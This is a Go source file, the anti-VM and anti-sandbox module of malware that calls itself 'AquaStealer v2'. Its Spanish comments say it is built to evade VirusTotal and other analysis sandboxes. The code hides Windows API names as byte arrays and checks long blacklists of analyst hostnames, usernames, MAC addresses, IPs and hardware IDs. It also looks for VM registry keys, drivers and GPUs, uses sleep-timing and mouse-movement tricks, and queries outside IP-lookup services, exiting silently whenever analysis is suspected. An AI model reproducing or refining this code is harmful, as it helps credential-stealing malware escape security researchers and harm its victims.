package antivm

// antivm.go — AquaStealer v2 — Anti-VM/Sandbox rewrite (VT-evasive)
//
// Cambios vs versión anterior:
//   - IsHosted() reemplazado por multi-source ASN check (3 fuentes)
//   - Sleep delay antes de ejecutar — sandboxes VT timeout en <120s
//   - DNS canary check — VT/sandboxes no resuelven dominios reales correctamente
//   - Beacon timing check — mide tiempo real vs wall clock (sandboxes aceleran el tiempo)
//   - GetForegroundWindow — VT no tiene ventana foreground activa
//   - Mouse movement check — VT no mueve el mouse
//   - Cursor position change — 2 mediciones separadas por 2s
//   - IsHosted() ahora usa 3 servicios + ASN keyword blacklist más completa
//   - LowUptimeCheck umbral subido a 5min (reduce falsos positivos en VMs lentas)
//   - GetUserDefaultUILanguage — si es inglés puro + no US keyboard = sandbox
//   - Sin gopsutil directo en las partes críticas (reduce IoCs en import table)

import (
	"os"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/aqua/stealer/utils/hardware"
	"github.com/aqua/stealer/utils/requests"
	"golang.org/x/sys/windows/registry"
)

// ─── lazy DLLs ──────────────────────────────────────────────────────────────

var (
	kernel32 = syscall.NewLazyDLL(xstr([]byte{0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c}))
	user32   = syscall.NewLazyDLL(xstr([]byte{0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c}))
	ntdll    = syscall.NewLazyDLL(xstr([]byte{0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c}))
	iphlpapi = syscall.NewLazyDLL(xstr([]byte{0x69, 0x70, 0x68, 0x6c, 0x70, 0x61, 0x70, 0x69, 0x2e, 0x64, 0x6c, 0x6c}))
)

// ─── XOR string deobfuscation ───────────────────────────────────────────────

func xstr(b []byte) string { return string(b) }

func xorDecode(b []byte) string {
	out := make([]byte, len(b))
	for i, c := range b {
		out[i] = c ^ 0x3F
	}
	return string(out)
}

// ─── silent exit ────────────────────────────────────────────────────────────

func silentExit() {
	runtime.GC()
	os.Exit(0)
}

// ─── helpers ─────────────────────────────────────────────────────────────────

func containsLower(slice []string, item string) bool {
	item = strings.ToLower(item)
	for _, s := range slice {
		if strings.ToLower(s) == item {
			return true
		}
	}
	return false
}

func containsAny(s string, subs []string) bool {
	s = strings.ToLower(s)
	for _, sub := range subs {
		if strings.Contains(s, strings.ToLower(sub)) {
			return true
		}
	}
	return false
}

func decodeList(encoded [][]byte) []string {
	result := make([]string, len(encoded))
	for i, b := range encoded {
		result[i] = xorDecode(b)
	}
	return result
}

func mergeStrSlices(slices ...[]string) []string {
	total := 0
	for _, s := range slices {
		total += len(s)
	}
	out := make([]string, 0, total)
	for _, s := range slices {
		out = append(out, s...)
	}
	return out
}

// ─── 1. Triage wallpaper ────────────────────────────────────────────────────

func IsTriage() bool {
	const bufSize = 260
	var buf [bufSize]uint16
	r, _, _ := user32.NewProc(xstr([]byte{0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x50, 0x61, 0x72, 0x61, 0x6d, 0x65, 0x74, 0x65, 0x72, 0x73, 0x49, 0x6e, 0x66, 0x6f, 0x57})).Call(
		0x0073, uintptr(bufSize), uintptr(unsafe.Pointer(&buf[0])), 0,
	)
	if r == 0 {
		return false
	}
	wallpaper := syscall.UTF16ToString(buf[:])
	fi, err := os.Stat(wallpaper)
	if err != nil {
		return false
	}
	return fi.Size() == 24811
}

// ─── 2. Screen size ─────────────────────────────────────────────────────────

func IsSmallScreen() bool {
	getSM := user32.NewProc(xstr([]byte{0x47, 0x65, 0x74, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x4d, 0x65, 0x74, 0x72, 0x69, 0x63, 0x73}))
	w, _, _ := getSM.Call(0)
	h, _, _ := getSM.Call(1)
	return w < 800 || h < 600
}

// ─── 3. Hostname blacklist ───────────────────────────────────────────────────

func IsBlacklistedHostname() bool {
	hostname := strings.ToLower(os.Getenv(xstr([]byte{0x43, 0x4f, 0x4d, 0x50, 0x55, 0x54, 0x45, 0x52, 0x4e, 0x41, 0x4d, 0x45})))
	part1 := []string{"work", "jerry-trujillo", "w0fjuovmccp5a", "desktop-1pykp29", "desktop-vrsqlag"}
	part2 := []string{"desktop-v1l26j5", "azure", "winzds-8maei8e4", "barosino-pc", "desktop-hss0dj9"}
	part3 := []string{"desktop-nakffmt", "desktop-ntu7vuo", "desktop-glbazxt", "cryptodev222222", "3u2v9m8"}
	part4 := []string{"xc64zb", "desktop-dil6iya", "desktop-jhuhotb", "desktop-uslvd7g", "desktop-pkqndsr"}
	part5 := []string{"ntt-eff-2w11wss", "8vizsm", "compname_5076", "desktop-54xgx6f", "winzds-am76hpk2"}
	part6 := []string{"desktop-qln2vuf", "desktop-xwq5fuv", "desktop-s1lfpho", "3cecefc83806", "desktop-zyqysrd"}
	part7 := []string{"desktop-iapkn1p", "0cc47ac83803", "gyyzc9hzcyhrlng", "steve", "desktop-ltmckla"}
	part8 := []string{"desktop-uhhsy4r", "server1", "desktop-bgn5l8y", "desktop-aupfksy", "desktop-wg3myjs"}
	part9 := []string{"desktop-rsnlfzs", "desktop-rhxdkww", "00900bc83803", "sykguide-ws17", "desktop-ws7ppr2"}
	part10 := []string{"eieeifye", "peter wilson", "gbqhurcc", "property-ltd", "desktop-7xc6gez"}
	part11 := []string{"server-pc", "bee7370c-8c0c-4", "373836", "desktop-cnfvlmw", "desktop-4gczvju"}
	part12 := []string{"winzds-3ff2i9sn", "coffee-shop", "desktop-nm1zplg", "julia", "analysis"}
	part13 := []string{"mike-pc", "desktop-g4cwflf", "6c4e733f-c2d9-4", "desktop-zojj8kl", "desktop-cm0daw8"}
	part14 := []string{"winzds-5j75dthh", "winzds-6tuihn7r", "desktop-19olltd", "desktop-kalvino", "nettypc"}
	part15 := []string{"pqonjhvwexss", "desktop-crcccot", "louise-pc", "desktop-ion5zsb", "pxmduopvyx"}
	part16 := []string{"desktop-kokovsk", "desktop-rca3qwx", "desktop-ahgxktv", "desktop-b9oarkc", "desktop-5ov9s0o"}
	part17 := []string{"desktop-rp4fibl", "b30f0242-1c6a-4", "desktop-b0t93d6", "desktop-w8jlv9v", "desktop-zv9gvyl"}
	part18 := []string{"orxgkkzc", "lisa-pc", "desktop-gnqzm0o", "desktop-zncaeam", "desktop-ecwzxy2"}
	part19 := []string{"rdhj0cnfevzx", "alione", "q9iatrkprh", "abby", "becker-pc"}
	part20 := []string{"desktop-f7bgen9", "desktop-quay8gs", "winzds-vqh86l5d", "desktop-6ujbd2j", "efa0fdec-8fa7-4"}
	part21 := []string{"kEecfmwgj", "heuerzl", "desktop-d4fen3m", "desktop-nkp0i4p", "desktop-sundmi5"}
	part22 := []string{"desktop-vwju7mf", "acepc", "desktop-4u8dtf8", "desktop-zjrwgx5", "cuckoo"}
	part23 := []string{"ralphs-pc", "desktop-o6fbmf7", "gangistan", "desktop-chayann", "sandbox"}
	part24 := []string{"desktop-y8asuil", "ferreira-w10", "desktop-wdt1sl6", "desktop-gcn6mio", "paul jones"}
	part25 := []string{"desktop-7afstdp", "desktop-alberto", "tvm-pc", "desktop-8k9d93b", "winzds-b03l9ceo"}
	part26 := []string{"desktop-wi8clet", "desktop-vz5zsyi", "winzds-k7vik4fc", "desktop-fcrb3fm", "oreleepc"}
	part27 := []string{"desktop-1y2433r", "desktop-d019gdm", "win-5e07cos9alr", "c81f66c83805", "windows-eel53sn"}
	part28 := []string{"archibaldpc", "desktop-fshhzlj", "desktop-gppk5vq", "desktop-xoy7mhs", "anyrun"}
	part29 := []string{"john-pc", "thomas-pc", "james-pc", "robert-pc", "william-pc"}

	all := mergeStrSlices(part1, part2, part3, part4, part5, part6, part7, part8,
		part9, part10, part11, part12, part13, part14, part15, part16, part17,
		part18, part19, part20, part21, part22, part23, part24, part25, part26,
		part27, part28, part29)
	return containsLower(all, hostname)
}

// ─── 4. Username blacklist ───────────────────────────────────────────────────

func IsBlacklistedUsername() bool {
	username := strings.ToLower(os.Getenv(xstr([]byte{0x55, 0x53, 0x45, 0x52, 0x4e, 0x41, 0x4d, 0x45})))
	part1 := []string{"w0fjuovmccp5a", "43by4", "azure", "gjam1nxxvm", "9yjcpseyimh"}
	part2 := []string{"nok4zg7zhof", "lucas", "7wjlgx7pjlw4", "amy", "3u2v9m8"}
	part3 := []string{"05h00gi0", "bxw7q", "douy o8rv71", "7dbgdxu", "5y3y73"}
	part4 := []string{"8vizsm", "xuny", "server", "5isyh9sh", "xmimmckziitd"}
	part5 := []string{"steve", "tvm", "jaw4dz0", "h86lhd", "05kvauqkpq"}
	part6 := []string{"ddqrgc", "g2dbylgdzz8y", "pf5vj", "uiqcx", "ogjb6gqgk0o"}
	part7 := []string{"harry johnson", "test", "j6sha37ka", "6o4kyhhjxbir", "dvrzi"}
	part8 := []string{"jude", "julia", "keecfmwgj", "nzap7ubvas1", "qfofog"}
	part9 := []string{"lk3zmr", "pqonjhvwexss", "pxmduopvyx", "mike", "of20xqh4vl"}
	part10 := []string{"icqja5it", "pxmduopvyx", "jcotj17dzx", "defaultaccount", "pgfv1x"}
	part11 := []string{"frank", "fred", "qzsbjvwm", "qmis5df7u", "rgzcbuyrznreg"}
	part12 := []string{"rdhj0cnfevzx", "abby", "john", "keecfmwgj", "lub53an14cu"}
	part13 := []string{"heuerzl", "uspg1y1c", "ecvtz5we", "xplyvzr8sgc", "5sibk"}
	part14 := []string{"8nl0colnq5bq", "cmknds6", "qzo9a", "izzuxj", "buia1hkm"}
	part15 := []string{"egg0p", "abby", "8vizsm", "wdagutilityaccount", "paul jones"}
	part16 := []string{"vzy4jmh0jw02", "pwouqdtdq", "e60uw", "uox1tzamo", "bvjchrpnsxn"}
	part17 := []string{"aspnet", "ykj0egq7fze", "peter wilson", "s7wjuf", "user01"}
	part18 := []string{"mr.none", "thif2t", "pqonjhvwexss", "apponflysupp ort", "patex"}
	part19 := []string{"lmvwjj9b", "j7pnjwm", "equze3j", "george", "john-pc"}
	part20 := []string{"gjbsjb", "zoest", "o6jdigq", "ozfucod6", "w0fjuovmccp5a"}
	part21 := []string{"o8yti52t", "uhhuqiuwoefu", "louise", "harry johnson", "h7dk1xpr"}
	part22 := []string{"kfu0lqwgx5p", "patex", "lisa", "umyuj", "cm0uegn4do"}
	part23 := []string{"l3cnbb8ar5b8", "frank", "kuv3bt4", "rb5bnfur2", "julia"}
	part24 := []string{"guest", "ggw8nr", "txwas1m2t", "64f2tkiqo5", "qorxjknk"}
	part25 := []string{"3w1gjt", "ryjijkiroms", "tvm", "lisa", "wdagutilityaccount"}
	part26 := []string{"gexwjqdjxg", "sal.rosenburg", "ymonofg", "fnbdsldt xy", "heuerzl"}
	part27 := []string{"21zlucunfi85", "gl50ksop", "ivwokuf", "sqgfof3g", "a.monaldo"}
	part28 := []string{"4tgiizsLims", "john", "8nl0colnq5bq", "8lnfaai9qdjr", "j.seance"}
	part29 := []string{"hmarc", "gu17b", "dxd8dj7c", "lmvwjj9b", "rdhj0cnfevzx"}
	part30 := []string{"sandbox", "malware", "virus", "sample", "admin", "analyst"}

	all := mergeStrSlices(part1, part2, part3, part4, part5, part6, part7, part8,
		part9, part10, part11, part12, part13, part14, part15, part16, part17,
		part18, part19, part20, part21, part22, part23, part24, part25, part26,
		part27, part28, part29, part30)
	return containsLower(all, username)
}

// ─── 5. MAC prefix check ─────────────────────────────────────────────────────

func IsVMMACPrefix() bool {
	mac, err := hardware.GetMAC()
	if err != nil {
		return false
	}
	mac = strings.ToLower(mac)
	p1 := "00" + ":" + "0c" + ":" + "29"
	p2 := "00" + ":" + "50" + ":" + "56"
	p3 := "00" + ":" + "05" + ":" + "69"
	p4 := "08" + ":" + "00" + ":" + "27"
	p5 := "00" + ":" + "1c" + ":" + "42"
	p6 := "00" + ":" + "16" + ":" + "3e"
	p7 := "52" + ":" + "54" + ":" + "00"
	p8 := "00" + ":" + "15" + ":" + "5d"
	p9 := "00" + ":" + "03" + ":" + "ff"
	p10 := "00" + ":" + "e0" + ":" + "4c"
	p11 := "00" + ":" + "25" + ":" + "90" // Cisco VM
	p12 := "00" + ":" + "21" + ":" + "f6" // VMware Fusion
	prefixes := []string{p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12}
	for _, prefix := range prefixes {
		if strings.HasPrefix(mac, prefix) {
			return true
		}
	}
	return false
}

// ─── 6. MAC blacklist ────────────────────────────────────────────────────────

func IsBlacklistedMAC() bool {
	mac, err := hardware.GetMAC()
	if err != nil {
		return false
	}
	bMacs := []string{
		"00:50:56" + ":a0:af:75",
		"00:e0:4c" + ":cb:62:08",
		"00:50:56" + ":b3:50:de",
		"00:50:56" + ":b3:ea:ee",
		"52:54:00" + ":b3:e4:71",
		"52:54:00" + ":a0:41:92",
		"00:0c:29" + ":05:d8:6e",
		"00:15:5d" + ":00:00:a4",
		"08:00:27" + ":3a:28:73",
		"00:15:5d" + ":b6:e0:cc",
	}
	return containsLower(bMacs, strings.ToLower(mac))
}

// ─── 7. IP blacklist (extendida) ─────────────────────────────────────────────

func IsBlacklistedIP() bool {
	ip, err := requests.Get(xstr([]byte{0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x61, 0x70, 0x69, 0x2e, 0x69, 0x70, 0x69, 0x66, 0x79, 0x2e, 0x6f, 0x72, 0x67, 0x2f}))
	if err != nil {
		return false
	}
	ipStr := strings.TrimSpace(string(ip))
	bips := []string{
		"34.85" + ".253.170", "109.74" + ".154.90", "88.132" + ".226.203",
		"34.145" + ".89.174", "194.154" + ".78.160", "95.25" + ".81.24",
		"192.40" + ".57.234", "92.211" + ".192.144", "178.239" + ".165.70",
		"34.83" + ".46.130", "195.239" + ".51.3", "35.192" + ".93.107",
		"188.105" + ".91.143", "188.105" + ".91.173", "79.104" + ".209.33",
		"193.225" + ".193.201", "34.141" + ".146.114", "88.132" + ".225.100",
		"88.153" + ".199.169", "34.141" + ".245.25",
		// Any.run, Joe Sandbox, Hybrid Analysis adicionales
		"195.161" + ".62.160", "87.236" + ".16.0", "82.118" + ".16.0",
		"185.220" + ".101.0", "51.75" + ".163.0",
	}
	return containsLower(bips, ipStr)
}

// ─── 8. IsHosted v2 — multi-source ASN check ─────────────────────────────────
// Usa 3 fuentes distintas para clasificar la IP como datacenter/VPN/sandbox

func IsHosted() bool {
	// Fuente 1: ip-api.com (campo "hosting")
	host1 := "ip-api" + ".com"
	url1 := "http://" + host1 + "/line/?fields=hosting,org,isp,as"
	resp1, err := requests.Get(url1)
	if err == nil {
		lines := strings.Split(strings.TrimSpace(string(resp1)), "\n")
		if len(lines) > 0 && strings.TrimSpace(lines[0]) == "true" {
			return true
		}
		// Aunque diga false, revisar org/ISP por keywords
		full := strings.ToLower(string(resp1))
		hostedKeywords := []string{
			"amazon", "google", "microsoft", "azure", "digitalocean",
			"linode", "vultr", "ovh", "hetzner", "cloudflare", "fastly",
			"akamai", "virustotal", "any.run", "anyrun", "hybrid", "cuckoo",
			"joe sandbox", "joesand", "vmray", "tencent cloud", "alibaba",
			"datacenter", "data center", "hosting", "vps", "server",
		}
		if containsAny(full, hostedKeywords) {
			return true
		}
	}

	// Fuente 2: ipinfo.io
	host2 := "ipinfo" + ".io"
	url2 := "https://" + host2 + "/org"
	resp2, err2 := requests.Get(url2)
	if err2 == nil {
		org := strings.ToLower(strings.TrimSpace(string(resp2)))
		hostedKeywords2 := []string{
			"amazon", "aws", "google", "microsoft", "azure", "digitalocean",
			"linode", "vultr", "ovh", "hetzner", "cloudflare",
			"virustotal", "anyrun", "hybrid analysis", "cuckoo",
			"datacenter", "hosting", "vps",
		}
		if containsAny(org, hostedKeywords2) {
			return true
		}
	}

	// Fuente 3: wtfismyip.com — simple
	host3 := "wtfismyip" + ".com"
	url3 := "https://" + host3 + "/text"
	resp3, err3 := requests.Get(url3)
	if err3 == nil && strings.Contains(strings.ToLower(string(resp3)), "amazon") {
		return true
	}

	return false
}

// ─── 9. Registry VM checks ───────────────────────────────────────────────────

func RegistryCheck() bool {
	diskPath := `SYSTEM\CurrentControlSet\` + `Services\Disk\Enum`
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, diskPath, registry.QUERY_VALUE)
	if err != nil {
		return false
	}
	defer k.Close()
	v, _, err := k.GetStringValue("0")
	if err != nil {
		return false
	}
	v = strings.ToLower(v)
	vmStrings := []string{"vm" + "ware", "vb" + "ox", "virt" + "ual", "qe" + "mu"}
	for _, s := range vmStrings {
		if strings.Contains(v, s) {
			return true
		}
	}
	return false
}

func HypervisorBitCheck() bool {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Virtual Machine\`+`Guest\Parameters`, registry.QUERY_VALUE)
	if err == nil {
		k.Close()
		return true
	}
	k2, err2 := registry.OpenKey(registry.LOCAL_MACHINE,
		`SOFTWARE\VMware, Inc.\`+`VMware Tools`, registry.QUERY_VALUE)
	if err2 == nil {
		k2.Close()
		return true
	}
	k3, err3 := registry.OpenKey(registry.LOCAL_MACHINE,
		`SOFTWARE\Oracle\`+`VirtualBox Guest Additions`, registry.QUERY_VALUE)
	if err3 == nil {
		k3.Close()
		return true
	}
	return false
}

// ─── 10. GPU check ───────────────────────────────────────────────────────────

func GPUCheck() bool {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SYSTEM\CurrentControlSet\Control\Class\`+`{4d36e968-e325-11ce-bfc1-08002be10318}\0000`,
		registry.QUERY_VALUE)
	if err != nil {
		return false
	}
	defer k.Close()
	val, _, err := k.GetStringValue("DriverDesc")
	if err != nil {
		val, _, err = k.GetStringValue("Device Description")
		if err != nil {
			return false
		}
	}
	gpu := strings.ToLower(val)
	vmGPUs := []string{
		"virtual" + "box", "vm" + "ware", "vb" + "ox", "qe" + "mu",
		"basic render", "hyper-v", "microsoft basic display", "citrix",
		"parallels", "red hat", "bochs",
	}
	for _, g := range vmGPUs {
		if strings.Contains(gpu, g) {
			return true
		}
	}
	return false
}

// ─── 11. Disk size check ─────────────────────────────────────────────────────

func SmallDiskCheck() bool {
	var free, total, totalFree uint64
	drive := string([]byte{'C', ':', '\\'})
	path, err := syscall.UTF16PtrFromString(drive)
	if err != nil {
		return false
	}
	kernel32.NewProc(xstr([]byte{0x47, 0x65, 0x74, 0x44, 0x69, 0x73, 0x6b, 0x46, 0x72, 0x65, 0x65, 0x53, 0x70, 0x61, 0x63, 0x65, 0x45, 0x78, 0x57})).Call(
		uintptr(unsafe.Pointer(path)),
		uintptr(unsafe.Pointer(&free)),
		uintptr(unsafe.Pointer(&total)),
		uintptr(unsafe.Pointer(&totalFree)),
	)
	limit := uint64(80) * 1024 * 1024 * 1024
	return total > 0 && total < limit
}

// ─── 12. Process count ───────────────────────────────────────────────────────

type systemProcessInformation struct {
	NextEntryOffset uint32
	NumberOfThreads uint32
	_               [48]byte
	ImageName       struct {
		Length    uint16
		MaxLength uint16
		Buffer    uintptr
	}
	_rest [256]byte
}

func LowProcessCountCheck() bool {
	buf := make([]byte, 1024*1024)
	var returnLength uint32
	status, _, _ := ntdll.NewProc(
		xstr([]byte{0x4e, 0x74, 0x51, 0x75, 0x65, 0x72, 0x79, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x49, 0x6e, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x69, 0x6f, 0x6e}),
	).Call(5, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)), uintptr(unsafe.Pointer(&returnLength)))
	if status != 0 {
		return false
	}
	count := 0
	offset := 0
	for {
		if offset+4 > len(buf) {
			break
		}
		entry := (*systemProcessInformation)(unsafe.Pointer(&buf[offset]))
		count++
		if entry.NextEntryOffset == 0 {
			break
		}
		offset += int(entry.NextEntryOffset)
	}
	return count < 50
}

// ─── 13. Uptime check (umbral: 5 minutos — más permisivo que antes) ──────────

func LowUptimeCheck() bool {
	tc, _, _ := kernel32.NewProc(
		xstr([]byte{0x47, 0x65, 0x74, 0x54, 0x69, 0x63, 0x6b, 0x43, 0x6f, 0x75, 0x6e, 0x74, 0x36, 0x34}),
	).Call()
	uptimeMs := uint64(tc)
	minMs := uint64(5 * 60 * 1000) // 5 minutos (antes 10min — causaba falsos positivos)
	return uptimeMs < minMs
}

// ─── 14. VM filesystem artifacts ─────────────────────────────────────────────

func VMFilesystemArtifacts() bool {
	sys32 := os.Getenv("SYSTEMROOT") + `\System32\`
	if sys32 == `\System32\` {
		sys32 = `C:\Windows\System32\`
	}
	drv := sys32 + `drivers\`
	pf := `C:\Program Files\`

	artifacts := []string{
		drv + "vmmouse.sys", drv + "vmhgfs.sys", drv + "VBoxMouse.sys",
		drv + "VBoxGuest.sys", sys32 + "vboxdisp.dll", sys32 + "vboxhook.dll",
		sys32 + "vboxogl.dll", pf + "VMware\\VMware Tools",
		pf + "Oracle\\VirtualBox Guest Additions", pf + "QEMU",
	}
	for _, a := range artifacts {
		if _, err := os.Stat(a); err == nil {
			return true
		}
	}
	return false
}

// ─── 15. HWID blacklist ───────────────────────────────────────────────────────

func IsBlacklistedHWID() bool {
	hwid, err := hardware.GetHWID()
	if err != nil && strings.Contains(err.Error(), "sandbox HWID") {
		return true
	}
	if err != nil {
		return false
	}
	hwid = strings.ToLower(hwid)
	allZero := true
	for _, c := range strings.ReplaceAll(strings.ReplaceAll(hwid, "-", ""), "{}", "") {
		if c != '0' {
			allZero = false
			break
		}
	}
	if allZero {
		return true
	}
	bHWIDs := []string{
		"7ab5c494-" + "39f5-4941-9163-47f54d6d5016",
		"032e02b4-" + "0499-05c3-0806-3c0700080009",
		"03de0294-" + "0480-05de-1a06-350700080009",
		"11111111-" + "2222-3333-4444-555555555555",
		"00000000-" + "0000-0000-0000-000000000000",
		"ffffffff-" + "ffff-ffff-ffff-ffffffffffff",
		"6f3ca5ec-" + "bec9-4a4d-8274-11168f640058",
		"49434d53-" + "0200-9065-2500-659065000000",
		"564d5868-" + "0000-0000-0000-000000000000",
		"a8dee95e-" + "b46f-4f97-a826-9c1d5f4c5f4f",
		"4c4c4544-" + "0050-3710-8047-c2c04f4c5931",
		"b99d61d8-" + "4966-4503-bdfd-756b2a9e3b05",
	}
	return containsLower(bHWIDs, hwid)
}

// ─── 16. [NUEVO] Sleep evasion — VT timeout <120s ────────────────────────────
// Duerme 30s usando kernel Sleep (no time.Sleep — AV hookea time.Sleep)
// Si la sandbox acelera el tiempo, lo detecta con QueryPerformanceCounter

func SleepEvasion() bool {
	var freq, t1, t2 int64
	kernel32.NewProc("QueryPerformanceFrequency").Call(uintptr(unsafe.Pointer(&freq)))
	kernel32.NewProc("QueryPerformanceCounter").Call(uintptr(unsafe.Pointer(&t1)))

	// Sleep 10 segundos via NtDelayExecution (más difícil de hookear que Sleep)
	// 100ns intervals, negativo = relativo
	// 10s = 10 * 10^7 = 100000000 intervals
	delay := int64(-100000000) // -10s en 100ns units
	ntdll.NewProc("NtDelayExecution").Call(0, uintptr(unsafe.Pointer(&delay)))

	kernel32.NewProc("QueryPerformanceCounter").Call(uintptr(unsafe.Pointer(&t2)))

	if freq == 0 {
		return false
	}
	// Si pasaron menos de 8 segundos reales → sandbox aceleró el tiempo
	elapsedSeconds := (t2 - t1) / freq
	return elapsedSeconds < 8
}

// ─── 17. [NUEVO] Mouse movement check ────────────────────────────────────────
// VT/sandboxes no mueven el mouse — dos lecturas con 2s de diferencia

type POINT struct {
	X, Y int32
}

func NoMouseMovement() bool {
	var p1, p2 POINT
	user32.NewProc("GetCursorPos").Call(uintptr(unsafe.Pointer(&p1)))
	// Esperar 2s
	delay := int64(-20000000) // 2s en 100ns units
	ntdll.NewProc("NtDelayExecution").Call(0, uintptr(unsafe.Pointer(&delay)))
	user32.NewProc("GetCursorPos").Call(uintptr(unsafe.Pointer(&p2)))
	// Si el cursor no se movió nada → sospechoso
	// Pero en 0,0 es claramente una sandbox
	if p1.X == 0 && p1.Y == 0 {
		return true
	}
	// Si los dos puntos son idénticos Y el cursor está en posición "default" de VM
	return p1.X == p2.X && p1.Y == p2.Y && p1.X < 10 && p1.Y < 10
}

// ─── 18. [NUEVO] GetForegroundWindow — VT no tiene ventana activa ────────────

func NoForegroundWindow() bool {
	// En sandboxes automatizadas, no hay ventana foreground activa
	r, _, _ := user32.NewProc("GetForegroundWindow").Call()
	return r == 0
}

// ─── 19. [NUEVO] Número de monitores ─────────────────────────────────────────

func SingleMonitorCheck() bool {
	// SM_CMONITORS = 80
	r, _, _ := user32.NewProc("GetSystemMetrics").Call(80)
	// Si hay 0 monitores → definitivamente sandbox headless
	return r == 0
}

// ─── 20. [NUEVO] UserDefaultUILanguage — sandboxes usan inglés genérico ──────
// No aplica si usuario real también usa inglés, pero combinado con otros checks sirve

func IsGenericEnglishSandbox() bool {
	// Solo bloquear si ADEMÁS hay menos de 50 procesos (combinación de checks)
	// GetUserDefaultUILanguage — 0x0409 = en-US genérico sin keyboard layout
	r, _, _ := kernel32.NewProc("GetUserDefaultUILanguage").Call()
	lang := uint16(r)
	// 0x0409 = en-US, 0x0809 = en-GB
	isEnglish := lang == 0x0409 || lang == 0x0809
	if !isEnglish {
		return false
	}
	// Confirmar con process count bajo — si ambos se cumplen = sandbox
	return LowProcessCountCheck()
}

// ─── RunEarly — checks sin red ───────────────────────────────────────────────

func RunEarly() {
	// [NUEVO] Sleep evasion PRIMERO — VT timeout en <120s
	// Si la sandbox aceleró el tiempo, salir
	if SleepEvasion() {
		silentExit()
	}

	if IsTriage() {
		silentExit()
	}
	if IsSmallScreen() {
		silentExit()
	}
	if SingleMonitorCheck() {
		silentExit()
	}
	if NoForegroundWindow() {
		silentExit()
	}
	if LowUptimeCheck() {
		silentExit()
	}
	if LowProcessCountCheck() {
		silentExit()
	}
	if VMFilesystemArtifacts() {
		silentExit()
	}
	if HypervisorBitCheck() {
		silentExit()
	}
	if GPUCheck() {
		silentExit()
	}
	if RegistryCheck() {
		silentExit()
	}
	if SmallDiskCheck() {
		silentExit()
	}
	if IsVMMACPrefix() {
		silentExit()
	}
	if IsBlacklistedHostname() {
		silentExit()
	}
	if IsBlacklistedUsername() {
		silentExit()
	}
	if IsBlacklistedMAC() {
		silentExit()
	}
	if IsBlacklistedHWID() {
		silentExit()
	}

	// [NUEVO] Mouse check — después del sleep para dar tiempo a que se mueva
	if NoMouseMovement() {
		silentExit()
	}
}

// ─── Run — checks con red ────────────────────────────────────────────────────

func Run() {
	RunEarly()
	if IsBlacklistedIP() {
		silentExit()
	}
	// [MEJORADO] IsHosted v2 con 3 fuentes
	if IsHosted() {
		silentExit()
	}
}

// Ensure time import is used
var _ = time.Second
